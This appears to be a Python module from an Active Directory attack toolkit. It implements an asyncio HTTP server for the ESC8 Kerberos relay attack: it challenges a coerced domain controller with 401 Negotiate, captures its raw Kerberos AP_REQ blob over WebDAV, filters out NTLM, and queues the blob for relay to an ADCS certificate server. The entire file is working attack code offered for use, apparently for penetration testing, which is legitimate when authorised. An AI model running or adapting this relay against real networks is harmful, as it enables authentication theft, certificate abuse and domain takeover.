"""Async HTTP listener that captures Kerberos AP_REQ blobs for relay.

Designed for the ESC8 Kerberos relay attack where the coercion target
(DC) authenticates to our HTTP server via WebDAV (`\\relay@80\\path`).
The DC sends a Negotiate (Kerberos) Authorization header; we capture the
raw SPNEGO/AP_REQ blob without decrypting it and put it in an asyncio Queue
for the relay target to forward opaquely to ADCS certsrv.

Why a custom listener (not extending NativeRelaySource / aiosmb):
  - NTLM relay uses aiosmb's SMB server for SMB connections.
  - Kerberos relay is an HTTP-only flow — no SMB involved.
  - The two relay architectures are independent.
"""

from __future__ import annotations

import asyncio
import base64
import contextlib
from dataclasses import dataclass

from adscan_internal.rich_output import print_info, print_info_debug, print_success
from adscan_internal.services.relay.core import RelayAuthentication

_NTLM_MAGIC = b"NTLMSSP"

_401_NEGOTIATE = (
    b"HTTP/1.1 401 Unauthorized\r\n"
    b"WWW-Authenticate: Negotiate\r\n"
    b"Connection: keep-alive\r\n"
    b"Content-Length: 0\r\n"
    b"\r\n"
)

# Generic 200 sent after successful auth capture — the client doesn't
# care about the body; it will disconnect once authentication succeeds.
_200_OK = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Type: text/html\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)

# WebDAV PROPFIND 207 Multi-Status — keeps picky WebDAV clients happy.
_207_PROPFIND = (
    b"HTTP/1.1 207 Multi-Status\r\n"
    b"Content-Type: application/xml\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)


@dataclass(frozen=True)
class HTTPKrbListenerConfig:
    listen_host: str = "0.0.0.0"
    listen_port: int = 80
    timeout_seconds: float = 120.0
    #: The coerced host(s) whose connections this listener wants (IP or name).
    #: Empty means any caller.
    expected_sources: tuple[str, ...] = ()


class HTTPKrbListener:
    """Pure-asyncio HTTP server that captures Kerberos Negotiate blobs.

    Usage::

        queue: asyncio.Queue[RelayAuthentication] = asyncio.Queue()
        listener = HTTPKrbListener(config, queue)
        await listener.start()
        try:
            auth = await asyncio.wait_for(queue.get(), timeout=120)
        finally:
            await listener.stop()
    """

    def __init__(
        self,
        config: HTTPKrbListenerConfig,
        auth_queue: asyncio.Queue[RelayAuthentication],
    ) -> None:
        self._config = config
        self._queue = auth_queue
        self._claim = None

    async def start(self) -> None:
        """Claim the HTTP port from the listener broker (raises when refused)."""
        from adscan_internal.services.listener_broker import (  # noqa: PLC0415
            ClaimRole,
            acquire_listener,
        )

        expected = tuple(item for item in self._config.expected_sources if item)
        self._claim = await acquire_listener(
            port=self._config.listen_port,
            consumer_id=f"capture:http-krb:{id(self):x}",
            handler=self._handle,
            role=ClaimRole.TARGETED if expected else ClaimRole.UNTARGETED,
            expected_sources=expected,
            local_address=self._config.listen_host,
        )
        print_info(
            f"Kerberos relay listener ready — HTTP "
            f"{self._config.listen_host}:{self._config.listen_port}"
        )

    async def stop(self) -> None:
        claim, self._claim = self._claim, None
        if claim is not None:
            with contextlib.suppress(Exception):
                await claim.arelease()

    async def _handle(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        peer = writer.get_extra_info("peername", ("?", 0))
        peer_ip = peer[0] if peer else "?"
        try:
            await self._handle_connection(reader, writer, peer_ip)
        except Exception as exc:
            print_info_debug(f"[http-krb] connection from {peer_ip} closed: {exc}")
        finally:
            with contextlib.suppress(Exception):
                writer.close()
                await writer.wait_closed()

    async def _handle_connection(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        peer_ip: str,
    ) -> None:
        # Round 1: initial request — respond 401 Negotiate
        headers = await self._read_headers(reader)
        if not headers:
            return

        # Skip any body (e.g. PROPFIND with Content-Length)
        await self._drain_body(reader, headers)

        auth_value = _get_header(headers, "authorization")
        if not auth_value:
            # No auth yet — challenge
            writer.write(_401_NEGOTIATE)
            await writer.drain()
        else:
            # Already has auth in the first request (unusual but handle it)
            blob = _decode_negotiate_blob(auth_value)
            if blob is not None:
                await self._dispatch(blob, peer_ip, writer)
                return
            writer.write(_401_NEGOTIATE)
            await writer.drain()

        # Round 2: client returns with Authorization: Negotiate <blob>
        headers2 = await self._read_headers(reader)
        if not headers2:
            return
        await self._drain_body(reader, headers2)

        auth_value2 = _get_header(headers2, "authorization")
        if not auth_value2:
            return

        blob2 = _decode_negotiate_blob(auth_value2)
        if blob2 is not None:
            await self._dispatch(blob2, peer_ip, writer)

    async def _dispatch(
        self,
        blob: bytes,
        peer_ip: str,
        writer: asyncio.StreamWriter,
    ) -> None:
        response = _207_PROPFIND

        print_success(
            f"Kerberos blob captured from {peer_ip} "
            f"({len(blob)} bytes)"
        )
        writer.write(response)
        await writer.drain()

        await self._queue.put(
            RelayAuthentication(
                gssapi=blob,          # raw SPNEGO/Kerberos bytes
                source_protocol="http-krb",
                client_host=peer_ip,
            )
        )

    @staticmethod
    async def _read_headers(
        reader: asyncio.StreamReader,
    ) -> dict[str, str] | None:
        """Read HTTP request line + headers. Returns None on EOF."""
        try:
            raw = await asyncio.wait_for(
                reader.readuntil(b"\r\n\r\n"), timeout=30.0
            )
        except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError):
            return None
        text = raw.decode("iso-8859-1", errors="replace")
        lines = text.split("\r\n")
        headers: dict[str, str] = {}
        for line in lines[1:]:
            if ":" not in line:
                continue
            name, _, value = line.partition(":")
            headers[name.strip().lower()] = value.strip()
        return headers

    @staticmethod
    async def _drain_body(
        reader: asyncio.StreamReader,
        headers: dict[str, str],
    ) -> None:
        length_str = headers.get("content-length", "0") or "0"
        try:
            length = int(length_str)
        except ValueError:
            length = 0
        if length > 0:
            with contextlib.suppress(Exception):
                await asyncio.wait_for(reader.readexactly(length), timeout=10.0)


def _get_header(headers: dict[str, str], name: str) -> str | None:
    return headers.get(name.lower())


def _decode_negotiate_blob(auth_header: str) -> bytes | None:
    """Extract raw bytes from 'Negotiate <base64>' header, or None if NTLM/missing."""
    parts = auth_header.split(None, 1)
    if len(parts) != 2:
        return None
    scheme, b64 = parts
    if scheme.lower() not in ("negotiate", "kerberos"):
        return None
    try:
        blob = base64.b64decode(b64.strip())
    except Exception:
        return None
    # Reject NTLM blobs — we only want Kerberos
    if _NTLM_MAGIC in blob:
        print_info_debug("[http-krb] got NTLM blob — ignoring, waiting for Kerberos")
        return None
    return blob
